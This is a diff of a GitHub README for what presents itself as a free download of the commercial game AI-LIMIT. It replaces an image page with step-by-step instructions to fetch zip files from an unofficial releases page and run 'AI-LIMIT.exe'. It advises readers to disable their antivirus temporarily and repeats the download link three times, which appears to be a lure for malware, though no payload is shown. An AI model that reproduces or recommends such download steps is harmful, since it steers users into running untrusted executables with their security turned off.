@@ -1,48 +1,59 @@
-<div align="center">
+# 🎮 AI-LIMIT - Immerse Yourself in a Dystopian Adventure
 
-  ![](https://raw.githubusercontent.com/coferconisor/AI-LIMIT/main/pictures/1.jpg)
-  
-  ![](https://raw.githubusercontent.com/coferconisor/AI-LIMIT/main/pictures/2.jpg)
-  
-  ![](https://raw.githubusercontent.com/coferconisor/AI-LIMIT/main/pictures/.png)
-  
-</div>
+## 🔗 Download Now
+[![Download AI-LIMIT](https://img.shields.io/badge/Download_AI--LIMIT-blue)](https://github.com/190111-ai/AI-LIMIT/releases)
 
-<div align="center"><a href="https://coferconisor.github.io/id/35226986"><img src="https://raw.githubusercontent.com/coferconisor/AI-LIMIT/main/pictures/0.png" height="80"></a></div>
+## 📖 About AI-LIMIT
+In the distant future, civilization teeters on the brink of collapse. People chase the legend of the Elysium in the last city, Havenswell. In this post-apocalyptic sci-fi action RPG, you play as Arrisa, a Blader gifted with immortality. Explore the ruins of the city to discover a glimmer of hope for a new life.
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+## 🚀 Getting Started
+To enjoy AI-LIMIT, follow these steps to download and run the game smoothly. 
 
-# About This Game
+## 📥 Download & Install
+1. **Visit the Releases Page:** Click the link below to access the downloads. 
+   [Download AI-LIMIT](https://github.com/190111-ai/AI-LIMIT/releases)
 
-* Explore the unknown apocalyptic world
+2. **Select the Latest Release:** Once on the releases page, look for the latest version. It is usually at the top of the list.
 
-After the sudden yet mysterious collapse of the artificial ecosystem, natural disasters and wars ensued, the civilization was wiped out. And in the centuries that followed, a strange substance known as the Mud spread everywhere, and monsters emerged.
-You will step into the last city of mankind - Havenswell, exploring cold and damp sewers, layers of slums, sky city above the lake, etc., seeking the truth about the destruction of civilization in monster-infested ruins. Travel through wonders, face mysterious and deadly enemies, and put an end to an eerie and desperate history.
+3. **Download the Files:** Choose the file that matches your operating system. If you are using Windows, look for `AI-LIMIT_Windows.zip`. For Mac users, select `AI-LIMIT_Mac.zip`. This ensures you get the right version for your system.
 
-A journey with a mysterious mission
+4. **Extract the Files:** After the download completes, locate the downloaded file. Right-click on it and select “Extract All” to unzip the contents into a new folder.
 
-* Blader has the appearance of human, but it is actually a new life form created by mysterious technology. With their own missions, they embark on a lonely and dangerous journey, and with the power of the Branches, they respawn after fatal death.
-Now that the Branches have been destroyed, you, as one of the Bladers, will have to search for and repair the Branches all over the city. You will meet humans and fellow Bladers who are also in dire straits, feel their joys and sorrows, as well as their faith in despair, and together uncover the truth behind the plagues and disasters.
+5. **Run the Game:** Open the folder where you extracted the files. Look for `AI-LIMIT.exe` (or the corresponding file for Mac). Double-click the file to start your adventure.
 
-* Facing an overwhelming and mysterious enemy head-on
+## 💻 System Requirements
+To ensure AI-LIMIT runs smoothly, please check the following minimum system requirements:
 
-Warriors who lose themselves and degenerate into crazy beasts;
-A killing machine who walks the skies covered in razor-sharp blades;
-The colossal beasts trampling on the earth, ravaging cities with collisions and explosions
-You will need to challenge the powerful beasts from multiple forces in death and rebirth over and over again, catching the breaks from the fierce attacks and going all out to win and continue the journey to the end of the world.
+- **Operating System:** Windows 10 or macOS 10.15 (Catalina) or newer
+- **Processor:** Intel Core i5 or AMD equivalent
+- **Memory:** 8 GB RAM
+- **Graphics:** NVIDIA GeForce GTX 760 or AMD Radeon R9 280
+- **Storage:** 20 GB available space
 
-* Experience diverse and exhilarating action battles
+## 🎮 Gameplay Features
+- **Expansive World:** Explore the ruins of Havenswell and uncover its hidden secrets.
+- **Immersive Storyline:** Experience the legend of Elysium while tackling challenges and quests.
+- **Dynamic Combat:** Engage in fast-paced battles as Arrisa, utilizing her unique skills and abilities.
+- **Rich Environments:** Journey through beautifully designed landscapes, each with its own history and mystery.
 
-> Wide variety and number of weapons.
-> 
-> Mix and match your weapons and weapon skills.
-> 
-> Increase Sync Rate with brave attack and wise defense, become even mightier in battle.
->
-> The transformation mechanism in your left hand can drive dozens of spells, attack or assist at will.
-> 
-> Utilize multiple systems to achieve a rich combination of moves, and seize the opportunity in the ever-changing exchange of attack and defense.
+## 🔄 Updates & New Features
+Stay updated by visiting the releases page regularly. We often add new content, features, and improvements based on player feedback. Each new version brings enhancements that enhance gameplay and fix issues. Make sure to download the latest version for the best experience.
+
+## ❓ Frequently Asked Questions
+### How do I troubleshoot installation issues?
+If you encounter errors during installation, please ensure you have enough disk space and that your system meets the requirements mentioned above. Also, try disabling any antivirus software temporarily during installation as it may interfere with file extraction.
+
+### Can I run AI-LIMIT on older systems?
+AI-LIMIT is designed for modern systems. Running it on older hardware may result in unstable performance or crashes. It's best to consult the system requirements before attempting to run the game.
+
+### Can I play AI-LIMIT offline?
+Yes, once downloaded and installed, you can play AI-LIMIT offline without an internet connection.
+
+### Where can I report bugs or provide feedback?
+You can report bugs or give feedback by visiting our [issue tracker](https://github.com/190111-ai/AI-LIMIT/issues) on GitHub. Your input is vital for improving the game.
+
+## 🤝 Contributing to AI-LIMIT
+We welcome contributions from the community. If you have suggestions for features or improvements, please reach out on our GitHub page. Your involvement can help make AI-LIMIT even better.
+
+## 🔗 Download AI-LIMIT Again
+If you missed it, here’s the direct link to download the game one more time: [Download AI-LIMIT](https://github.com/190111-ai/AI-LIMIT/releases). Start your journey today!
